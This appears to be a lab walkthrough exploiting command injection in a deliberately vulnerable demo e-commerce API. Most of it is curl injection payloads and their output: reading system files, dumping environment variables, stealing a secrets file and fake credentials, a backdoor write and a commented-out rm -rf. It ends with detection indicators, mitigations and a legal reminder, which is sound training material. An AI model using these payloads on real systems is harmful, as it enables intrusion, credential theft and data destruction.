# Attack Demonstration Walkthrough

This document provides a complete step-by-step walkthrough of exploiting the vulnerable e-commerce application.

---

## Prerequisites

Before starting, ensure you have:

- [ ] Completed all setup steps in [SETUP.md](SETUP.md)
- [ ] Docker installed and running
- [ ] Python 3.8+ with `requests` library
- [ ] (Optional) GCP account with Cloud Run access

---

## Phase 1: Reconnaissance

### 1.1 Target Identification

First, we identify our target. The vulnerable application could be:

- **Local**: `http://localhost:8080` (for testing)
- **Cloud Run**: `https://vulnerable-ecommerce-xxxxx-uc.a.run.app`

### 1.2 Service Discovery

Test if the application is running:

```bash
# Check health endpoint
curl -s https://TARGET_URL/health | jq .
```

**Expected Response:**
```json
{
  "status": "healthy",
  "app": "VulnMart E-commerce API",
  "version": "1.0.0",
  "environment": "production"
}
```

### 1.3 Enumerate Endpoints

Visit the home page to see available endpoints:

```bash
curl -s https://TARGET_URL/ | head -100
```

Or open in a browser to see the API documentation.

**Key Endpoints Identified:**
- `/health` - Health check
- `/products` - Product listing
- `/search` - Product search
- `/ping` - **Network diagnostic utility** ⚠️

---

## Phase 2: Vulnerability Discovery

### 2.1 Test Normal Functionality

First, test the `/ping` endpoint with normal input:

```bash
curl -s "https://TARGET_URL/ping?host=localhost" | jq .
```

**Expected Response:**
```json
{
  "success": true,
  "host": "localhost",
  "command": "ping -c 1 localhost",
  "output": "PING localhost (127.0.0.1): 56 data bytes\n64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.045 ms\n..."
}
```

### 2.2 Test for Command Injection

Now, try adding a command separator:

```bash
curl -s "https://TARGET_URL/ping?host=localhost;id" | jq .
```

**Vulnerable Response:**
```json
{
  "success": true,
  "host": "localhost;id",
  "command": "ping -c 1 localhost;id",
  "output": "PING localhost...\nuid=1000(appuser) gid=1000(appuser) groups=1000(appuser)"
}
```

🚨 **VULNERABILITY CONFIRMED!** The `id` command executed successfully.

### 2.3 Additional Injection Tests

```bash
# Test with && 
curl -s "https://TARGET_URL/ping?host=localhost%20%26%26%20whoami"

# Test with |
curl -s "https://TARGET_URL/ping?host=localhost%7Cwhoami"

# Test with $()
curl -s "https://TARGET_URL/ping?host=%24(whoami)"
```

---

## Phase 3: Exploitation

### 3.1 System Information Gathering

**Get Current User:**
```bash
curl -s "https://TARGET_URL/ping?host=localhost;whoami" | jq -r '.output'
```

**Get Hostname:**
```bash
curl -s "https://TARGET_URL/ping?host=localhost;hostname" | jq -r '.output'
```

**Get OS Information:**
```bash
curl -s "https://TARGET_URL/ping?host=localhost;cat%20/etc/os-release" | jq -r '.output'
```

### 3.2 File System Enumeration

**List Current Directory:**
```bash
curl -s "https://TARGET_URL/ping?host=localhost;ls%20-la" | jq -r '.output'
```

**Expected Output:**
```
total 24
drwxr-xr-x 1 appuser appuser 4096 Jan 15 10:00 .
drwxr-xr-x 1 root    root    4096 Jan 15 09:55 ..
-rw-r--r-- 1 appuser appuser 5432 Jan 15 09:55 app.py
-rw-r--r-- 1 appuser appuser 3456 Jan 15 09:55 productdata.txt  <-- TARGET!
-rw-r--r-- 1 appuser appuser   78 Jan 15 09:55 requirements.txt
```

### 3.3 Data Exfiltration

**Extract Sensitive Product Data:**
```bash
curl -s "https://TARGET_URL/ping?host=localhost;cat%20productdata.txt" | jq -r '.output'
```

**Exfiltrated Data Contains:**
- 🔐 Database credentials
- 🔑 API keys and secrets
- 💰 Pricing information and margins
- 🏢 Internal network details
- 👤 Employee discount codes

### 3.4 Environment Variable Extraction

**Dump Environment Variables:**
```bash
curl -s "https://TARGET_URL/ping?host=localhost;env" | jq -r '.output'
```

This may reveal:
- Cloud provider metadata
- Service account credentials
- Application secrets
- Internal URLs

### 3.5 Process Information

**List Running Processes:**
```bash
curl -s "https://TARGET_URL/ping?host=localhost;ps%20aux" | jq -r '.output'
```

---

## Phase 4: Using the Exploit Script

For a more streamlined attack, use the provided exploit script:

### 4.1 Run the Exploit

```bash
cd exploit
python exploit.py https://TARGET_URL
```

### 4.2 Expected Output

```
╔═══════════════════════════════════════════════════════════════════════════════╗
║   ██████╗ ███████╗██████╗     ████████╗███████╗ █████╗ ███╗   ███╗            ║
║   ██╔══██╗██╔════╝██╔══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║            ║
║   ██████╔╝█████╗  ██║  ██║       ██║   █████╗  ███████║██╔████╔██║            ║
║   ██╔══██╗██╔══╝  ██║  ██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║            ║
║   ██║  ██║███████╗██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║            ║
║   ╚═╝  ╚═╝╚══════╝╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝            ║
║                   Command Injection Exploit Framework                         ║
╚═══════════════════════════════════════════════════════════════════════════════╝

════════════════════════════════════════════════════════════════════════════════
  TARGET VERIFICATION
════════════════════════════════════════════════════════════════════════════════

[*] Target URL: https://vulnerable-ecommerce-xxxxx-uc.a.run.app
[*] Checking target health...
[✓] Target is online!
[*]   Application: VulnMart E-commerce API
[*]   Version: 1.0.0
[*]   Environment: production
[*] Checking for vulnerable endpoint...
[✓] Vulnerable endpoint found: /ping

════════════════════════════════════════════════════════════════════════════════
  EXPLOITATION PHASE
════════════════════════════════════════════════════════════════════════════════

[1/8] Identify current user
[⚡] Executing: whoami
[✓] Command executed successfully!
────────────────────────────────────
  appuser
────────────────────────────────────

[2/8] Get container hostname
[⚡] Executing: hostname
[✓] Command executed successfully!
────────────────────────────────────
  localhost
────────────────────────────────────

[3/8] Get current directory
[⚡] Executing: pwd
[✓] Command executed successfully!
────────────────────────────────────
  /app
────────────────────────────────────

[4/8] List directory contents
[⚡] Executing: ls -la
[✓] Command executed successfully!
────────────────────────────────────
  total 28
  drwxr-xr-x 1 appuser appuser 4096 Jan 15 10:00 .
  drwxr-xr-x 1 root    root    4096 Jan 15 09:55 ..
  -rw-r--r-- 1 appuser appuser 8234 Jan 15 09:55 app.py
  -rw-r--r-- 1 appuser appuser 5678 Jan 15 09:55 productdata.txt
  -rw-r--r-- 1 appuser appuser   89 Jan 15 09:55 requirements.txt
────────────────────────────────────

[5/8] EXFILTRATE SENSITIVE DATA
[⚡] Executing: cat productdata.txt
[✓] Command executed successfully!

════════════════════════════════════════════════════════════════════
  🚨 SENSITIVE DATA EXFILTRATED 🚨
════════════════════════════════════════════════════════════════════

================================================================================
                     VULNMART CONFIDENTIAL PRODUCT DATA
================================================================================
                    ⚠️ INTERNAL USE ONLY - DO NOT DISTRIBUTE ⚠️
================================================================================

[... Full sensitive data displayed ...]

Production Database:
- Host: db-prod.vulnmart.internal
- Port: 5432
- Database: vulnmart_prod
- Username: app_service_account
- Password: Pr0d_Db_P@ssw0rd_2025!

[... API keys, secrets, and more ...]

════════════════════════════════════════════════════════════════════

[6/8] Get OS information
[⚡] Executing: cat /etc/os-release
[✓] Command executed successfully!

[7/8] Dump environment variables
[⚡] Executing: env
[✓] Command executed successfully!

[8/8] List running processes
[⚡] Executing: ps aux
[✓] Command executed successfully!

════════════════════════════════════════════════════════════════════════════════
  EXPLOITATION SUMMARY
════════════════════════════════════════════════════════════════════════════════

╔══════════════════════════════════════════════════════════════════╗
║                      ATTACK SUMMARY REPORT                       ║
╠══════════════════════════════════════════════════════════════════╣
  Target URL:        https://vulnerable-ecommerce-xxxxx-uc.a.run.app
  Attack Duration:   4.23 seconds
  Commands Executed: 8
  Successful:        8
  Failed:            0
╠══════════════════════════════════════════════════════════════════╣
║                     KEY FINDINGS                                 ║
╠══════════════════════════════════════════════════════════════════╣
  • Running as user: appuser
  • Container hostname: localhost
  • SENSITIVE DATA EXFILTRATED!
    - Database credentials exposed
    - API keys and secrets leaked
    - Internal network information revealed
╠══════════════════════════════════════════════════════════════════╣
║                    VULNERABILITY DETAILS                         ║
╠══════════════════════════════════════════════════════════════════╣
  Type:     Command Injection (CWE-78)
  Endpoint: /ping?host=<payload>
  Severity: CRITICAL
  Impact:   Remote Code Execution, Data Exfiltration
╚══════════════════════════════════════════════════════════════════╝

[✓] Exploitation complete!
[*] Total time: 4.23 seconds
```

---

## Phase 5: Attack Summary

### What Was Achieved

| Achievement | Impact |
|-------------|--------|
| Remote Command Execution | Full control over application container |
| User Context Identified | Running as `appuser` (non-root) |
| File System Access | Read access to application files |
| Sensitive Data Exfiltration | Database credentials, API keys leaked |
| Environment Variables | Cloud configuration exposed |
| Process Information | Application stack revealed |

### Data Exfiltrated

1. **Database Credentials**
   - Production database host and credentials
   - Staging database access

2. **API Keys**
   - Payment gateway (Stripe) keys
   - AWS access credentials
   - Internal API tokens

3. **Business Intelligence**
   - Wholesale vs retail pricing
   - Profit margins
   - Inventory levels

4. **Internal Network**
   - VPN gateway address
   - Admin panel URLs
   - Internal subnet ranges

---

## Phase 6: Post-Exploitation Scenarios

In a real engagement, an attacker might proceed to:

### 6.1 Credential Abuse

```bash
# Connect to exfiltrated database
psql -h db-prod.vulnmart.internal -U app_service_account -d vulnmart_prod
```

### 6.2 Lateral Movement

```bash
# Access internal services
curl http://admin.vulnmart.internal
```

### 6.3 Persistence

```bash
# Create a backdoor (example - not implemented in demo)
curl "https://TARGET/ping?host=localhost;echo 'backdoor' >> /tmp/shell"
```

### 6.4 Data Destruction (NOT RECOMMENDED)

```bash
# This would be destructive - NEVER do this without explicit authorization
# curl "https://TARGET/ping?host=localhost;rm -rf /app/*"
```

---

## Detection Indicators

Security teams should look for:

### Log Indicators

```
# Suspicious ping requests
[2025-01-15 10:23:45] GET /ping?host=localhost;id HTTP/1.1
[2025-01-15 10:23:46] GET /ping?host=localhost;cat%20/etc/passwd HTTP/1.1
[2025-01-15 10:23:47] GET /ping?host=localhost;cat%20productdata.txt HTTP/1.1
```

### Network Indicators

- Multiple rapid requests to `/ping` endpoint
- Unusual characters in query parameters (`;`, `|`, `&&`)
- Large response sizes from `/ping` (file contents)

### System Indicators

- Unexpected process spawning from web server
- File access to sensitive locations
- Outbound connections to unknown hosts

---

## Mitigation Steps

Immediate actions after discovering this vulnerability:

1. **Disable the vulnerable endpoint** temporarily
2. **Rotate all credentials** that may have been exposed
3. **Review access logs** for signs of exploitation
4. **Implement the secure code fix** (see [VULNERABILITY.md](VULNERABILITY.md))
5. **Deploy WAF rules** to block injection attempts
6. **Conduct incident response** if exploitation is confirmed

---

## Cleanup

After completing the demonstration:

```bash
# Remove GCP resources
./deploy/cleanup.sh

# Or manually
gcloud run services delete vulnerable-ecommerce --region=us-central1 --quiet
gcloud container images delete gcr.io/PROJECT_ID/vulnerable-ecommerce --force-delete-tags
```

---

## Lessons Learned

1. **Never trust user input** - Always validate and sanitize
2. **Avoid shell=True** - Use subprocess with argument lists
3. **Defense in depth** - Multiple layers of security
4. **Least privilege** - Run with minimal permissions
5. **Monitor and alert** - Detect attacks in progress
6. **Regular testing** - Find vulnerabilities before attackers do

---

## Legal Reminder

⚠️ **This demonstration was conducted against an intentionally vulnerable application owned by us.**

- Never perform these actions against systems without explicit authorization
- Unauthorized access is illegal and unethical
- Always operate within the bounds of your authorization
- Document your testing scope and permissions

---

*End of Attack Demonstration*
